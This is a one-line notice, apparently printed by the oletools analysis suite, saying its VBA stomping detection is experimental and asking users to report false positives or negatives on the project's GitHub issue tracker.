VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

